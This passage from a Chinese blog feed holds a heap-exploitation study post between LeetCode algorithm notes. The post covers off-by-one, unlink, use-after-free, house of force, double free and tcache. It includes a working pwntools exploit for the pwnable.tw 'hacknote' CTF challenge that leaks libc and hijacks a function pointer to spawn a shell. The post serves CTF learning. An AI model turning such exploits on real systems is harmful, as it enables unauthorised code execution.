CBTInserter(root);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;insert(v);</span></span><br><span class="line"><span class="comment"> * TreeNode* param_2 = obj-&gt;get_root();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>时间复杂度为 O (n)，队列中存的节点数为 O (n)，所以空间复杂度为 O (n)。</p>]]></content>
      
      
      <categories>
          
          <category> leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆题总结</title>
      <link href="/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/27/%E5%A0%86%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>堆基础总结</p><span id="more"></span><h2 id="堆数据结构"><a class="markdownIt-Anchor" href="#堆数据结构">#</a> 堆数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- chunk </span><br><span class="line">| prev_size |  size  |A|M|P|</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| user <span class="title function_">data</span><span class="params">(fd)</span> | <span class="params">(bk)</span>  |</span><br><span class="line">||</span><br><span class="line">||</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ &lt;-- next chunk</span><br></pre></td></tr></table></figure><h2 id="off-by-one"><a class="markdownIt-Anchor" href="#off-by-one">#</a> Off By One</h2><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理">#</a> 漏洞原理</h3><p>使用循环语句向堆块中写入数据时，循环次数设置错误导致多写入了一个字节</p><h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路">#</a> 利用思路</h3><ol><li><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p></li><li><p>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得  <code>prev_in_use</code>  位被清，这样前块会被认为是 free 块。</p><p>（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。</p><p>（2） 另外，这时  <code>prev_size</code>  域就会启用，就可以伪造  <code>prev_size</code>  ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照  <code>prev_size</code>  找到的块的大小与 <code>prev_size</code>  是否一致。</p></li></ol><h2 id="large-bin"><a class="markdownIt-Anchor" href="#large-bin">#</a> Large bin</h2><p>当 large bin 中只存在一个 chunk 时，那么该 chunk 的两个 nextsize 指针都会指向自己</p><h2 id="unlink"><a class="markdownIt-Anchor" href="#unlink">#</a> unlink</h2><p>unlink 过程如下图所示，主要实现堆块合并</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190305154531-a6fafb78-3f1a-1.png" alt="img"></p><p>对于 unlink (P,BK,FD) 函数本质是赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unlink(P,BK,FD)&#123;</span><br><span class="line">    FD = P -&gt; fd;</span><br><span class="line">    BK = p -&gt; bk;</span><br><span class="line">    FD -&gt; bk = BK;</span><br><span class="line">    BK -&gt; fd = fd;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>堆块结构 FD = *(p-0x10)，0x10 是由 fd 指针在堆块的位置决定的，具体利用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(P-&gt;fd+<span class="number">0x18</span>) = *(P-&gt;bk)</span><br><span class="line">*(P-&gt;bk+<span class="number">0x10</span>) = *(P-&gt;fd)</span><br></pre></td></tr></table></figure><h2 id="uaf"><a class="markdownIt-Anchor" href="#uaf">#</a> UAF</h2><h3 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2">#</a> 漏洞原理</h3><p>申请任意大小的堆块并在删除时未清空指针数组（即没有设置为 NUL），导致悬空指针从而产生 UAF</p><h3 id="利用思路-2"><a class="markdownIt-Anchor" href="#利用思路-2">#</a> 利用思路</h3><p>例题： <a href="http://pwnable.tw">pwnable.tw</a> - hacknote</p><p>解题思路：</p><p>通过 UAF 调用一个存在于堆块，并且被一系列对操作篡改的函数指针控制流劫持从而 getshell</p><blockquote><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/03/hacknote/">具体参考文章</a></p></blockquote><h4 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">64</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)    //unsortbin泄露libc地址</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])-<span class="number">0x1b07b0</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(system_addr)+<span class="string">&quot;;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-force"><a class="markdownIt-Anchor" href="#house-of-force">#</a> house of force</h2><h3 id="利用前提"><a class="markdownIt-Anchor" href="#利用前提">#</a> 利用前提</h3><ul><li>能够控制 top chunk 的 size 域（如堆溢出）</li><li>能够自由控制堆分配 size 大小，如申请负数的堆</li></ul><p>向上申请 chunk 实现任意地址写</p><h3 id="例题-bamboobox"><a class="markdownIt-Anchor" href="#例题-bamboobox">#</a> 例题 bamboobox</h3><p>修改长度可以覆盖到 top chunk 的 size 位置从而修改 top chunk size= -1, 因为 size 为无符号数，-1 被解释为 0xffffff。</p><p>利用 house of force 将 top chunk 位置放在 heap base，可以是 got 表地址也可以是分配的堆块地址。</p><p>再申请一个 0x10 堆块去修改函数指针为指定地址。</p><h2 id="double-free"><a class="markdownIt-Anchor" href="#double-free">#</a> Double Free</h2><h3 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3">#</a> 漏洞原理</h3><p>free 了两次堆块，在 glibc 中的检查如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123823-d61a9032-4549-1.png" alt="img"></p><p>检查 main_arean 是否指向了原来的一个 chunk, 绕过只需要</p><p>free (p1);free (p2);free (p1)，改写 fdd 指针一般执行 add 函数，然后连续 free 出 chunk2,chunk1 和构造的 fake_chunk（这个 chunk 的地址在 got 表上），对 got 表进行一个覆写，将 puts 函数 got 表改写成 magic 函数的地址。</p><h3 id="利用思路-3"><a class="markdownIt-Anchor" href="#利用思路-3">#</a> 利用思路</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123837-de246bae-4549-1.png" alt="img"></p><p>malloc 出一个 chunk1，更改 chunk1 的 fd，又由于此时 chunk1 在 fastbin list，因此可以指向一个 fakebin 实现任意地址写</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313123859-eb7d95dc-4549-1.png" alt="img"></p><h2 id="off-by-null-tcache-overlap"><a class="markdownIt-Anchor" href="#off-by-null-tcache-overlap">#</a> Off by null &amp;&amp; Tcache &amp;&amp; Overlap</h2><ul><li><p>off-by-null: 利用改写将 pre_issue 位改成 \x00 然后导致前面一个堆块莫名其妙的就 free 了（当然不是真的莫名其妙，详细请看堆块结构和记录，简单的说就是 pre_issue 是位了记录前一个堆块 free or use 情况的）。接着就是利用堆块合并，获得一个 free 的但是其实并没有 free 的堆块，这就是 overlap。整个过程其实说明了，off-by-null 可以触发 overlap，并且还是 powerful 的，可以用来泄漏地址。也可以用来修改 fd</p><blockquote><p>strcpy 字符串函数：复制时，遇到结束符  <code>\x00</code>  才会停止复制。复制结束后，会在最后写入一个结束符  <code>\x00</code></p><p><img src="https://img-blog.csdnimg.cn/img_convert/c9a4fb89febac9551f72c9dd1c35929f.png" alt="Pasted image 20210923152332.png"></p><p>strlen: j 不将’\x00’结束符计入字符串长度</p></blockquote></li><li><p>tcache: 这个机制和 fastbin 很像，但是为了效率会比 fastbin 少很多检查。并且堆块都会在 tacahe 走一遍再出来给我们使用，有一些特殊情况不会比如合并了的 unsortedbin。他总共有 7 个，满了才会用其他的类别的 chunk。对 double free 的检查基本没有。</p></li></ul><p>例题：<a href="https://blog.csdn.net/weixin_43921239/article/details/109252945">HITCON_2018_children_tcache</a></p><p>待补充 ing…</p><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://trick.ink/article/Heap_Learn/">https://trick.ink/article/Heap_Learn/</a></p><p><a href="https://blog.csdn.net/m0_56897090/article/details/120510003">https://blog.csdn.net/m0_56897090/article/details/120510003</a></p><p><a href="https://www.freebuf.com/system/171261.html">https://www.freebuf.com/system/171261.html</a></p><p><a href="https://xz.aliyun.com/t/4324#toc-15">https://xz.aliyun.com/t/4324#toc-15</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leetcode数据结构刷题(一)</title>
      <link href="/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>Leetcode 数据结构练习</p><span id="more"></span><h2 id="数组"><a class="markdownIt-Anchor" href="#数组">#</a> 数组</h2><h3 id="最大子序和"><a class="markdownIt-Anchor" href="#最大子序和">#</a> 最大子序和</h3><p>思路：动态规划</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>,maxn = nums[<span class="number">0</span>];     </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x:nums)&#123;</span><br><span class="line">            pre = Math.max(pre+x,x);</span><br><span class="line">            maxn = Math.max(pre,maxn);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="两数之和"><a class="markdownIt-Anchor" href="#两数之和">#</a> 两数之和</h3><p><strong>哈希表</strong>降时间复杂度从 o (n) 到 o (1)</p><p>创建一个哈希表，对于每一个  <code>x</code> ，我们首先查询哈希表中是否存在  <code>target - x</code> ，然后将  <code>x</code>  插入到哈希表中，即可保证不会让  <code>x</code>  和自己匹配。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hashtable.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;hashtable.get(target - nums[i]), i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="合并两个有序数组"><a class="markdownIt-Anchor" href="#合并两个有序数组">#</a> 合并两个有序数组</h3><p>给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。</p><p>请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。</p><p>注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。</p><blockquote><p>示例 1：</p><p>输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3<br> 输出：[1,2,2,3,5,6]<br> 解释：需要合并 [1,2,3] 和 [2,5,6] 。<br>合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。<br>示例 2：</p><p>输入：nums1 = [1], m = 1, nums2 = [], n = 0<br> 输出：[1]<br> 解释：需要合并 [1] 和 [] 。<br>合并结果是 [1] 。<br>示例 3：</p><p>输入：nums1 = [0], m = 0, nums2 = [1], n = 1<br> 输出：[1]<br> 解释：需要合并的数组是 [] 和 [1] 。<br>合并结果是 [1] 。<br>注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。</p></blockquote><p>exp</p><p><strong>一、双指针</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p1 = <span class="number">0</span>, p2 = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sorted[m + n];</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &lt; m || p2 &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == m) &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == n) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &lt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            &#125;</span><br><span class="line">            sorted[p1 + p2 - <span class="number">1</span>] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i != m + n; ++i) &#123;</span><br><span class="line">            nums1[i] = sorted[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>复杂度分析</p><p>时间复杂度：O (m+n)<br> 指针移动单调递增，最多移动 m+n 次，因此时间复杂度为 O (m+n)。</p><p>空间复杂度：O (m+n)。<br>需要建立长度为 m+n 的中间数组 sorted。</p><p><strong>二、逆向双指针</strong></p><p>从后向前遍历，将两者较大的元素放在 nums 数组的后面而不会被覆盖，降低了空间复杂度为 O (1)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> p1 = m - <span class="number">1</span>, p2 = n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> tail = m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span> (p1 &gt;= <span class="number">0</span> || p2 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 == <span class="number">-1</span>) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums1[p1] &gt; nums2[p2]) &#123;</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            &#125;</span><br><span class="line">            nums1[tail--] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="两个数组的交集"><a class="markdownIt-Anchor" href="#两个数组的交集">#</a> 两个数组的交集</h3><p>一、哈希表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">intersect</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums1.<span class="built_in">size</span>() &gt; nums2.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">intersect</span>(nums2, nums1);</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums1) &#123;</span><br><span class="line">            ++m[num];</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; intersection;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m.<span class="built_in">count</span>(num)) &#123;</span><br><span class="line">                intersection.<span class="built_in">push_back</span>(num);</span><br><span class="line">                --m[num];</span><br><span class="line">                <span class="keyword">if</span> (m[num] == <span class="number">0</span>) &#123;</span><br><span class="line">                    m.<span class="built_in">erase</span>(num);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> intersection;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>时间复杂度：O (m+n), 空间复杂度：O (min (m,n))</p><p>二、双指针排序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">### 买卖股票的最佳时机</span><br><span class="line"></span><br><span class="line">&gt;输入：[<span class="number">7</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>]</span><br><span class="line">&gt;输出：<span class="number">5</span></span><br><span class="line">&gt;解释：在第 <span class="number">2</span> 天（股票价格 = <span class="number">1</span>）的时候买入，在第 <span class="number">5</span> 天（股票价格 = <span class="number">6</span>）的时候卖出，最大利润 = <span class="number">6</span><span class="number">-1</span> = <span class="number">5</span> 。</span><br><span class="line">&gt;     注意利润不能是 <span class="number">7</span><span class="number">-1</span> = <span class="number">6</span>, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line"></span><br><span class="line">**动态规划**</span><br><span class="line"></span><br><span class="line">(来自题解）考虑每次如何获取最大收益，第i天的最大收益通过前i天的最低点就可以算出来。而第i天以前（包括第i天）的最低点和i<span class="number">-1</span>天的最低点有关，因此动态方程为</span><br><span class="line"></span><br><span class="line">dp[i] = <span class="built_in">min</span>(d[i<span class="number">-1</span>],prices[i])</span><br><span class="line">其中dp[<span class="number">0</span>]=prices[<span class="number">0</span>],然后动态计算之后的就可以了。 得到了前i天的最低点以后，只需要维护一个max用来保存最大收益就可以了。 时间复杂度为<span class="built_in">O</span>(n),一次遍历，空间复杂度O（n）的动态规划，代码如下：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">        <span class="comment">//dp[i]表示截止到i，价格的最低点是多少   dp[i]=min(dp[i-1],nums[i])</span></span><br><span class="line">        <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="type">int</span>[prices.length];</span><br><span class="line">        dp[<span class="number">0</span>] = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            dp[i] = (dp[i - <span class="number">1</span>] &lt; prices[i]) ? dp[i - <span class="number">1</span>] : prices[i];</span><br><span class="line">            max = (prices[i] - dp[i]) &gt; max ? prices[i] - dp[i] : max;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br></pre></td></tr></table></figure><p>接着考虑优化空间，仔细观察动态规划的辅助数组，其实每一次只用到了 dp [-1] 这一个空间，因此可以把数组改成单个变量 dp 来存储截止到第 i 天的价格最低点。优化之后的代码就是题解中的方法二。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> inf = <span class="number">1e9</span>;</span><br><span class="line">        <span class="type">int</span> minprice = inf, maxprofit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> price: prices) &#123;</span><br><span class="line">            maxprofit = <span class="built_in">max</span>(maxprofit, price - minprice);</span><br><span class="line">            minprice = <span class="built_in">min</span>(price, minprice);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxprofit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间复杂度 O (n), 空间复杂度 O (1)</p><h2 id="树和二叉树"><a class="markdownIt-Anchor" href="#树和二叉树">#</a> 树和二叉树</h2><h3 id="二叉树的深度"><a class="markdownIt-Anchor" href="#二叉树的深度">#</a> 二叉树的深度</h3><p>输入一棵二叉树的根节点，求该树的深度。从根节点到叶节点依次经过的节点（含根、叶节点）形成树的一条路径，最长路径的长度为树的深度。</p><p>例如：</p><p>给定二叉树 [3,9,20,null,null,15,7]，</p><blockquote><p>​3</p></blockquote><blockquote><p>/ <br>9  20<br>/  <br>15   7<br> 返回它的最大深度 3 。</p></blockquote><h4 id="法一dfs"><a 